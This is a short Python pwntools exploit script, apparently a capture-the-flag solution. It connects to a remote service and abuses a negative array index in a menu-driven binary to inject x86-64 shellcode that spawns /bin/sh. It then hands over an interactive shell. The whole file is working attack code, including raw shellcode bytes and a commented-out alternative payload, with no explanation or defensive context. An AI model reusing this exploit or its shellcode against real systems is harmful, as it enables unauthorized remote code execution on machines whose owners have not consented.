from pwn import *

#r = process("./shellcode")
r = remote("128.199.104.41",23170)

#context.log_level = 'debug'

#shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#shell = asm(shellcraft.amd64.linux.sh())
#shell = asm(shellcode)

shell = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

r.sendlineafter("Your Choice: ","1")
r.sendlineafter("Index: ","-9")
r.sendlineafter("Size: ",str(len(shell)+10))
r.sendlineafter("Data: ",shell)
r.sendlineafter("Your Choice: ","3")
r.interactive()